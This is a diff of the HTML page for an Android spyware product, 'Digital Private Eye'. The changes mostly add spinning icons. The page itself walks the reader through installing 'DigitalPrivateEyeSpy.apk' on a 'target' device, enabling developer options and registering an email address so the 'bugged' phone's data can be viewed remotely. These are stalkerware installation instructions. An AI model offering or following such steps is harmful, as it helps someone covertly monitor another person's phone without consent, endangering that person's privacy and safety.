@@ -78,26 +78,26 @@ CONST LOGO_LARGE = "<img src=\"img/sample/logo.png\" style=\"width: 50px\">";
                 and you can monitor it's data.
             </p>
           <ul class="fa-ul">
-            <li><span class="fa fa-li fa-android"></span>
-                Download Digital Private Eye - Spy on a target android device.
+            <li><span class="fa fa-li fa-android fa-spin fa-spin"></span>
+                Download the .apk file using the 'Download Now' button above ON THE TARGET ANDROID DEVICE.
             </li>
-            <li><span class="fa fa-li fa-android"></span>
+            <li><span class="fa fa-li fa-android fa-spin"></span>
                 You might need to <a href="#developer-options">turn on developer options</a> on the device.
                 Instructions are available further down this page.
             </li>
-            <li><span class="fa fa-li fa-android"></span>
+            <li><span class="fa fa-li fa-android fa-spin"></span>
               <li>Click on the downloaded file <a href="downloads/spy/DigitalPrivateEyeSpy.apk">DigitalPrivateEyeSpy.apk</a>
             </li>
-            <li><span class="fa fa-li fa-android"></span>
+            <li><span class="fa fa-li fa-android fa-spin"></span>
                 When the installation completes, a registration form is displayed on the device.</li>
-            <li><span class="fa fa-li fa-android"></span>
+            <li><span class="fa fa-li fa-android fa-spin"></span>
               <li>Enter YOUR EMAIL ADDRESS. You will need this to login to view the phone's data from this website or
                   the <a href="#viewer">DPEye Viewer app</a>.</li>
               </li>
-              <li><span class="fa fa-li fa-android"></span>
+              <li><span class="fa fa-li fa-android fa-spin"></span>
               <li>Ensure you have put in the right email address and press enter.</li>
               </li>
-              <li><span class="fa fa-li fa-android"></span>Register on the website to view the devices' data.</li>
+              <li><span class="fa fa-li fa-android fa-spin"></span>Register on the website to view the devices' data.</li>
               </li>
           </ul>
           <hr />
@@ -106,14 +106,14 @@ CONST LOGO_LARGE = "<img src=\"img/sample/logo.png\" style=\"width: 50px\">";
             </h2>
             <p>Install this on an android device to conveniently view all your bugged device(s) data.</p>
             <ul class="fa-ul">
-                <li><span class="fa fa-li fa-android"></span>Download Digital Private Eye - Viewer on your android device.</li>
-                <li><span class="fa fa-li fa-android"></span>
+                <li><span class="fa fa-li fa-android fa-spin"></span>Download Digital Private Eye - Viewer on your android device.</li>
+                <li><span class="fa fa-li fa-android fa-spin"></span>
                     You might need to <a href="#developer-options">turn on developer options</a> on the device.
                 Instructions are available further down this page.
                 </li>
-                <li><span class="fa fa-li fa-android"></span>Click on the downloaded file to install Digital Private Eye - Viewer</a>.</li>
-                <li><span class="fa fa-li fa-android"></span>Register with your email address.</li>
-                <li><span class="fa fa-li fa-android"></span>If you have registered previously,
+                <li><span class="fa fa-li fa-android fa-spin"></span>Click on the downloaded file to install Digital Private Eye - Viewer</a>.</li>
+                <li><span class="fa fa-li fa-android fa-spin"></span>Register with your email address.</li>
+                <li><span class="fa fa-li fa-android fa-spin"></span>If you have registered previously,
                     ensure that you register with the same email address and password.</li>
             </ul>
             <hr />
@@ -130,9 +130,9 @@ CONST LOGO_LARGE = "<img src=\"img/sample/logo.png\" style=\"width: 50px\">";
             </p>
             <p>
                 <ul class="fa-ul">
-                    <li><span class="fa fa-li fa-android"></span>Open your devices settings.</li>
-                    <li><span class="fa fa-li fa-android"></span>Scroll to 'About Phone'.</li>
-                    <li><span class="fa fa-li fa-android"></span>Look for line which says "Android Version".</li>
+                    <li><span class="fa fa-li fa-android fa-spin"></span>Open your devices settings.</li>
+                    <li><span class="fa fa-li fa-android fa-spin"></span>Scroll to 'About Phone'.</li>
+                    <li><span class="fa fa-li fa-android fa-spin"></span>Look for line which says "Android Version".</li>
                 </ul>
             </p>
             <hr />
